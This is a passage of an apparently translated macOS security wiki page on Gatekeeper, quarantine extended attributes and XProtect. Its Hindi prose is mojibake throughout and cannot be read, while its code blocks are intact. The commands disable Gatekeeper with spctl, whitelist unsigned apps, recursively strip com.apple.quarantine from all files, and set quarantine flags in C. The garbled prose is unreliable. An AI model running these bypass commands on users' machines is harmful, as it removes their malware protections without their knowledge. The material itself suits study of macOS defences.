рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ GateKeeper рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЬрд╛рдВрдЪ рдХреЗрд╡рд▓ **рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рд╡рд┐рд╢реЗрд╖рддрд╛ рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЛрдВ** рдкрд░ рдХреА рдЬрд╛рддреА рд╣реИ, рд╣рд░ рдлрд╝рд╛рдЗрд▓ рдкрд░ рдирд╣реАрдВред
{% endhint %}

GateKeeper рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ **рдкреНрд░рд╛рдердорд┐рдХрддрд╛рдУрдВ рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░** рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХреНрдпрд╛ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

<figure><img src="../../../.gitbook/assets/image (1147).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд░рдЦрдиреЗ рд╡рд╛рд▓рд╛ рдбреЗрдЯрд╛рдмреЗрд╕ **`/var/db/SystemPolicy`** рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИред рдЖрдк рдЗрд╕ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪреЗрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдкрд╣рд▓рд╛ рдирд┐рдпрдо "**App Store**" рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реБрдЖ рдФрд░ рджреВрд╕рд░рд╛ "**Developer ID**" рдореЗрдВ рдФрд░ рдкрд┐рдЫрд▓реЗ рдЗрдореЗрдЬ рдореЗрдВ рдпрд╣ **App Store рдФрд░ рдкрд╣рдЪрд╛рдиреЗ рдЧрдП рдбреЗрд╡рд▓рдкрд░реНрд╕ рд╕реЗ рдРрдкреНрд╕ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рд╕рдХреНрд╖рдорддрд╛** рдереАред\
рдЕрдЧрд░ рдЖрдк рдЙрд╕ рд╕реЗрдЯрд┐рдВрдЧ рдХреЛ App Store рдкрд░ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рддреЗ рд╣реИрдВ, рддреЛ "**Notarized Developer ID" рдирд┐рдпрдо рд╣рдЯ рдЬрд╛рдПрдВрдЧреЗ**ред

**GKE рдкреНрд░рдХрд╛рд░** рдХреЗ рд╣рдЬрд╛рд░реЛрдВ рдирд┐рдпрдо рднреА рд╣реИрдВ:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
рдпреЗ рд╣реИрд╢ рд╣реИрдВ рдЬреЛ **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** рдФрд░ **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`** рд╕реЗ рдЖрддреЗ рд╣реИрдВ

рдпрд╛ рдЖрдк рдкрд┐рдЫрд▓реА рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
sudo spctl --list
```
рд╡рд┐рдХрд▓реНрдк **`--master-disable`** рдФрд░ **`--global-disable`** рдХрд╛ рдЙрдкрдпреЛрдЧ **`spctl`** рдХрд░рдХреЗ рдЗрди рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ **рдЕрдХреНрд╖рдо** рдХрд░ рджреЗрдЧрд╛:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
рдЬрдм рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕рдХреНрд╖рдо рд╣реЛ рдЬрд╛рдП, рддреЛ рдПрдХ рдирдпрд╛ рд╡рд┐рдХрд▓реНрдк рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛:

<figure><img src="../../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

GateKeeper рджреНрд╡рд╛рд░рд╛ рдХреНрдпрд╛ рдХрд┐рд╕реА рдРрдк рдХреЛ рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдПрдЧреА рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```bash
spctl --assess -v /Applications/App.app
```
**GateKeeper рдореЗрдВ рдирдП рдирд┐рдпрдо рдЬреЛрдбрд╝рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ:**
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдлрд╝рд╛рдЗрд▓реЗрдВ

**рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдпрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдкрд░, рд╡рд┐рд╢рд┐рд╖реНрдЯ macOS **рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдЬреИрд╕реЗ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдпрд╛ рдИрдореЗрд▓ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ **рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рд╛рде рдПрдХ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдлрд╝рд╛рдЗрд▓ рдЧреБрдгрд╡рддреНрддрд╛** рдЬреЛ рд╕рд╛рдорд╛рдиреНрдпрдд: "**рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдЭрдВрдбрд╛**" рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдиреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ **рдЬреЛрдбрд╝рддреЗ рд╣реИрдВ**ред рдпрд╣ рдЧреБрдгрд╡рддреНрддрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдХреЗ рд░реВрдк рдореЗрдВ **рдЪрд┐рд╣реНрдирд┐рдд рдХрд░рддреА рд╣реИ** рдХрд┐ рдпрд╣ рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╕реНрд░реЛрдд (рдЗрдВрдЯрд░рдиреЗрдЯ) рд╕реЗ рдЖ рд░рд╣реА рд╣реИ, рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рдЬреЛрдЦрд┐рдо рд▓реЗ рд╕рдХрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рднреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕ рдЧреБрдгрд╡рддреНрддрд╛ рдХреЛ рдирд╣реАрдВ рдЬреЛрдбрд╝рддреЗ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд╕рд╛рдорд╛рдиреНрдп рдмрд┐рдЯрдЯреЛрд░реЗрдВрдЯ рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдЖрдо рддреМрд░ рдкрд░ рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЫреЛрдбрд╝ рджреЗрддреЗ рд╣реИрдВред

**рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдЭрдВрдбрд╛ рдХреА рдореМрдЬреВрджрдЧреА рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рддреЛ macOS рдХреЗ рдЧреЗрдЯрдХреАрдкрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕реБрд╡рд┐рдзрд╛ рдХреЛ рд╕рдВрдХреЗрдд рдХрд░рддреА рд╣реИ**ред

рдЙрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЬрд╣рд╛рдВ **рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдЭрдВрдбрд╛ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ** (рдХреБрдЫ рдмрд┐рдЯрдЯреЛрд░реЗрдВрдЯ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд╕рд╛рде), рдЧреЗрдЯрдХреАрдкрд░ рдХреА **рдЬрд╛рдВрдЪреЗрдВ рд╕рдВрдкрдиреНрди рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕рд╛рд╡рдзрд╛рдиреА рдмрд░рддрдиреА рдЪрд╛рд╣рд┐рдП рдЬрдм рд╡реЗ рдХрдо рд╕реБрд░рдХреНрд╖рд┐рдд рдпрд╛ рдЕрдЬреНрдЮрд╛рдд рд╕реНрд░реЛрддреЛрдВ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрд▓рддреЗ рд╣реИрдВред

{% hint style="info" %}
рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░реЛрдВ рдХреА **рдорд╛рдиреНрдпрддрд╛** рдХреА **рдЬрд╛рдВрдЪ** рдПрдХ **рд╕рдВрд╕рд╛рдзрди-рдкреНрд░рдЪреБрд░** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЛрдб рдФрд░ рдЙрд╕рдХреЗ рд╕рднреА рд╕рдВрдЧрдард┐рдд рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб **рд╣реИрд╢** рдЙрддреНрдкрдиреНрди рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдорд╛рдиреНрдпрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдореЗрдВ рдЙрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдСрдирд▓рд╛рдЗрди рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдЬрд╛рд░реА рдХрд┐рдП рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж рд░рджреНрдж рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрди рдХрд╛рд░рдгреЛрдВ рд╕реЗ, рд╣рд░ рдмрд╛рд░ рдЬрдм рдПрдХ рдРрдк рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдкреВрд░реНрдг рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдФрд░ рдиреЛрдЯрд░рд╛рдЗрдЬреЗрд╢рди рдЬрд╛рдВрдЪ **рдЕрд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рд╣реЛрддреА рд╣реИ**ред

рдЗрд╕рд▓рд┐рдП, рдпреЗ рдЬрд╛рдВрдЪреЗрдВ **рдХреЗрд╡рд▓ рдЙрд╕ рд╕рдордп рдЪрд▓рд╛рдИ рдЬрд╛рддреА рд╣реИрдВ рдЬрдм рдХрд┐рд╕реА рдРрдк рдХреЛ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдЧреБрдгрд╡рддреНрддрд╛ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред
{% endhint %}

{% hint style="warning" %}
рдпрд╣ рдЧреБрдгрд╡рддреНрддрд╛ **рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреЗ/рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬреЛ рд╣реЛрддреА рд╣реИрдВ, рдЙрдирдХреЗ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣рд░ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдпрд╣ рдЧреБрдгрд╡рддреНрддрд╛ рд╕реЗрдЯ рдХреА рдЬрд╛рдПрдЧреАред рдФрд░ рдЧреИрд░ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдРрдкреНрд╕ рдЗрд╕реЗ рдЦреБрдж рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) рдХреБрдВрдЬреА рдХреЛ **Info.plist** рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рд╕реЗ рд╕рд┐рд╕реНрдЯрдо `com.apple.quarantine` рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдЧреБрдгрд╡рддреНрддрд╛ рдХреЛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рд╕реЗрдЯ рдХрд░ рджреЗрдЧрд╛ред
{% endhint %}

рдЗрд╕рдХреА рд╕реНрдерд┐рддрд┐ рдХреА **рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рдФрд░ рд╕рдХреНрд╖рдо/рдЕрдХреНрд╖рдо** (рд░реВрдЯ рдЖрд╡рд╢реНрдпрдХ) рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде **рдпрд╣ рднреА рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХрд┐рд╕реА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рддрд╛** рд╣реИ:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдЧреБрдгреЛрдВ рдХреА **рдорд╛рди** рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ рдЙрд╕ рдРрдк рдХреЛ рдЦреЛрдЬреЗрдВ рдЬрд┐рд╕рдиреЗ quarantine рдЧреБрдг рд▓рд┐рдЦрд╛ рд╣реИ:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ "рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдкрд░ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдЭрдВрдбреЗ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕реЗ рд╡рд╣ рдмрдирд╛рддреА рд╣реИ" (рдореИрдВрдиреЗ рдПрдХ рдмрдирд╛рдИ рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ USER\_APPROVED рдЭрдВрдбрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рд▓реЗрдХрд┐рди рдпрд╣ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддрд╛): 

<details>

<summary>рд╕реНрд░реЛрдд рдХреЛрдб рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдЭрдВрдбреЗ рд▓рд╛рдЧреВ рдХрд░реЗрдВ</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

рдФрд░ **рдЙрд╕ рдЧреБрдг рдХреЛ** рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣рдЯрд╛рдПрдБ:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
рдФрд░ рд╕рднреА рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрдВрдб рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрдЬреЗрдВ:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдЬрд╛рдирдХрд╛рд░реА рднреА **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`** рдореЗрдВ рд▓реЙрдиреНрдЪрд╕рд░реНрд╡рд┐рд╕реЗрд╕ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдПрдХ рдХреЗрдВрджреНрд░реАрдп рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реЛрддреА рд╣реИред

#### **Quarantine.kext**

рдХрд░реНрдиреЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗрд╡рд▓ **рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдХрд░реНрдиреЗрд▓ рдХреИрд╢ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** рдЙрдкрд▓рдмреНрдз рд╣реИ; рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк **https://developer.apple.com/** рд╕реЗ рдХрд░реНрдиреЗрд▓ рдбреАрдмрдЧ рдХрд┐рдЯ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдПрдХ рд╕рд┐рдореНрдмреЛрд▓рд┐рдХреЗрдЯреЗрдб рд╕рдВрд╕реНрдХрд░рдг рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛ред

### XProtect

XProtect рдореИрдХрдУрдПрд╕ рдореЗрдВ рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдд **рдПрдВрдЯреА-рдореИрд▓рд╡реЗрдпрд░** рд╕реБрд╡рд┐рдзрд╛ рд╣реИред XProtect **рдЬрд╛рдирд╛ рдорд▓рд╡реЗрдпрд░ рдФрд░ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХрд┐рд╕реА рднреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдЬрдм рдпрд╣ рдкрд╣рд▓реА рдмрд╛рд░ рд▓реЙрдиреНрдЪ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЬрдм рдЖрдк рдХрд┐рд╕реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХреБрдЫ рдРрдкреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ Safari, Mail, рдпрд╛ Messages, XProtect рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИред рдЕрдЧрд░ рдпрд╣ рдЕрдкрдиреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рдХрд┐рд╕реА рднреА рдЬрд╛рдирд╛ рдорд▓рд╡реЗрдпрд░ рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ XProtect **рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЪрд▓рд╛рдиреЗ рд╕реЗ рд░реЛрдХреЗрдЧрд╛** рдФрд░ рдЖрдкрдХреЛ рдЦрддрд░реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реВрдЪрд┐рдд рдХрд░реЗрдЧрд╛ред

XProtect рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ **рдирдП рдорд▓рд╡реЗрдпрд░ рдкрд░рд┐рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдирд┐рдпрдорд┐рдд рд░реВрдк рд╕реЗ** Apple рджреНрд╡рд╛рд░рд╛ рдЕрдкрдбреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдпреЗ рдЕрдкрдбреЗрдЯ рдЖрдкрдХреЗ рдореИрдХ рдкрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдЗрд╕рд╕реЗ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХрд┐ XProtect рд╣рдореЗрд╢рд╛ рдирд╡реАрдирддрдо рдЬрд╛рдиреЗ рдЧрдП рдЦрддрд░реЛрдВ рдХреЗ рд╕рд╛рде рдЕрдк-рдЯреВ-рдбреЗрдЯ рд╣реИред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рд╣реИ рдХрд┐ **XProtect рдПрдХ рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕рдорд╛рдзрд╛рди рдирд╣реАрдВ рд╣реИ**ред рдпрд╣ рдХреЗрд╡рд▓ рдирд┐рд╢реНрдЪрд┐рдд рд╕реВрдЪреА рдХреЗ рдЬрд╛рдиреЗ рдЧрдП рдЦрддрд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЕрдзрд┐рдХрд╛рдВрд╢ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдХреА рддрд░рд╣ рдСрди-рдПрдХреНрд╕реЗрд╕ рд╕реНрдХреИрдирд┐рдВрдЧ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

рдЖрдк рдирд╡реАрдирддрдо XProtect рдЕрдкрдбреЗрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

